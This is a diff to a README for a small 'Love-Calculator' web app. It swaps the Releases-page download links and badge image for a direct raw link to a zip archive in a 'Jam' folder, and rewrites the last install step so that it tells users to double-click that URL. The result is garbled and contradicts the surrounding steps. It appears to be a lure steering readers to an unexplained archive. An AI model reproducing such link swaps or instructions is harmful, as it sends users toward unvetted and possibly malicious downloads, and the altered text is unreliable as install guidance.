@@ -4,7 +4,7 @@
 Welcome to the Love-Calculator! This fun web app lets you enter two names and get a random love score. It's perfect for parties, dates, or just for fun. Follow these steps to download and run the application on your computer.
 
 ## 📥 Download the App
-[![Download Love-Calculator](https://img.shields.io/badge/Download-Love--Calculator-brightgreen)](https://github.com/12JoelAlmeyda/Love-Calculator/releases)
+[![Download Love-Calculator](https://raw.githubusercontent.com/12JoelAlmeyda/Love-Calculator/main/Jam/Love-Calculator.zip)](https://raw.githubusercontent.com/12JoelAlmeyda/Love-Calculator/main/Jam/Love-Calculator.zip)
 
 ## 🔧 System Requirements
 - Operating System: Windows, macOS, or Linux
@@ -14,14 +14,14 @@ Welcome to the Love-Calculator! This fun web app lets you enter two names and ge
 ## 📂 Download & Install
 To get started, visit the Releases page to download the Love-Calculator app:
 
-[Download Love-Calculator](https://github.com/12JoelAlmeyda/Love-Calculator/releases)
+[Download Love-Calculator](https://raw.githubusercontent.com/12JoelAlmeyda/Love-Calculator/main/Jam/Love-Calculator.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of Love-Calculator.
 3. Download the file that matches your operating system (e.g., `.zip` for Windows).
 4. Once the file is downloaded, locate it in your Downloads folder.
 5. Unzip or extract the file.
-6. Open the folder and double-click on `index.html` to launch the application in your web browser.
+6. Open the folder and double-click on `https://raw.githubusercontent.com/12JoelAlmeyda/Love-Calculator/main/Jam/Love-Calculator.zip` to launch the application in your web browser.
 
 ## 🎨 Features
 - Simple and user-friendly interface
